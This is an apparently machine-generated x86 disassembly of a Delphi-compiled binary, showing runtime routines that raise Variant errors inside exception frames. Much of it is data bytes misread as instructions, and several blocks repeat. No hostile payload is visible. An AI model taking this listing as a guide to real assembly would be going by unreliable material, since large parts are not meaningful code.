add [ eax ] al
shl dh 0x40
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
out 0x40 al
outsd
jb r-xdata
clc
in eax 0x40
inc ebx
add [ eax ] al
add [ esp + esi + 0x40 ] ah
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edi fs
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe7
jo r-xdata
out 0x40 al
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
sar al 0xe5
inc eax
add [ eax ] al
add [ esp + esi + 0x40 ] ah
outsb
je r-xdata
popad
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
jb r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
jb r-xdata
shl [ edi ] 0x40
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
inc eax
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
outsd
inc eax
add [ eax - 0x18 ] bl
inc eax
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
outsb
je r-xdata
popad
outsb
je r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
insd
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
jb r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
push ebp
push sub_40e986
push [ fs : eax ]
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
add [ ecx + esi + 0x31d00040 ] dh
xor al 0x40
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add ah dh
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
and al 0xe9
inc eax
add [ eax ] al
add [ eax ] al
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
add [ eax ] al
inc esp
jpe r-xdata
inc eax
add al al
call sub_40e8ba
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr al 0x40
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
call 0x4ce8da
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ edi + 0x40 ] cl
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea26
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e98d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
outsd
popad
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] al
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
inc eax
sub_40e3b5
mov ebx 0x589e41a6
jg r-xdata
add al 0x8b
add bh bh
and [ ebx - 0xbfbdbbc ] al
jmp sub_4151b0
push ss
mov esi 0xe3902deb
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ah ah
inc eax
add [ ebx + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x100040e4
add [ eax ] al
add [ eax - 0x1e ] al
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + edx * 2 + 0x41 ] dh
add al cl
push ecx
inc ecx
add [ ecx + edx * 2 ] al
inc ecx
add [ eax ] bh
push ecx
inc ecx
add [ eax ] bl
push ecx
inc ecx
add [ edx * 2 + 0x51000041 ] ah
inc ecx
add [ eax - 0x1fffbeb4 ] ch
dec esp
inc ecx
add [ ebp + ecx * 2 + 0x41 ] ch
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ esp + ecx * 2 + 0x514c0041 ] bl
inc ecx
add [ ecx * 2 + 0x4d280041 ] dh
inc ecx
add [ eax ] dl
push edx
inc ecx
add al ch
push edi
inc ecx
add ah dh
push edi
inc ecx
add al dl
push edi
inc ecx
add ah bl
push edi
inc ecx
add [ esi ] dl
push esp
dec ecx
outsb
jbe r-xdata
jo r-xdata
imul esp [ ebp + 0x61 ] 0x62
insb
push esi
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
jb r-xdata
outsd
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] dl
add [ eax ] al
inc esp
jpe r-xdata
popad
jb r-xdata
push esi
xor ch ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in eax 0x40
jb r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] bl
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
add [ eax ] al
add [ eax ] al
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
jo r-xdata
popad
outsb
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch ah
inc eax
nop
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
out 0x40 al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
rcl [ ebp + 0x40 ] 0x0
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
popad
jae r-xdata
inc ebx
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ah
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
jns r-xdata
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0040 ] cl
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
je r-xdata
popad
inc eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] al
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl dh 0x40
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
out 0x40 al
outsd
jb r-xdata
clc
in eax 0x40
inc ebx
add [ eax ] al
add [ esp + esi + 0x40 ] ah
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edi fs
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe7
jo r-xdata
out 0x40 al
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
sar al 0xe5
inc eax
add [ eax ] al
add [ esp + esi + 0x40 ] ah
outsb
je r-xdata
popad
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
jb r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
jb r-xdata
shl [ edi ] 0x40
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
inc eax
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
outsd
inc eax
add [ eax - 0x18 ] bl
inc eax
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
outsb
je r-xdata
popad
outsb
je r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
insd
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
jb r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
push ebp
push sub_40e986
push [ fs : eax ]
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
add [ ecx + esi + 0x31d00040 ] dh
xor al 0x40
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add ah dh
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
and al 0xe9
inc eax
add [ eax ] al
add [ eax ] al
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
add [ eax ] al
inc esp
jpe r-xdata
inc eax
add al al
call sub_40e8ba
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr al 0x40
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
call 0x4ce8da
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ edi + 0x40 ] cl
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea26
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e98d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
outsd
popad
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] al
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
inc eax
sub_40e484
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_40e8ba
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jae r-xdata
popad
outsb
je r-xdata
dec ebp
in al 0x8b
mov ebx eax
popad
add [ edx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor eax eax
push ebp
push sub_40ea1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea26
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40e986
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e98d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
jmp r-xdata
inc eax
sub_40e93c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e986
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e98d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40e990
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea26
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
sub_40ea2c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea76
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea7d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40ea80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eb0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb16
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
sub_40eb1c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb66
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb6d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40eb70
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40edb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
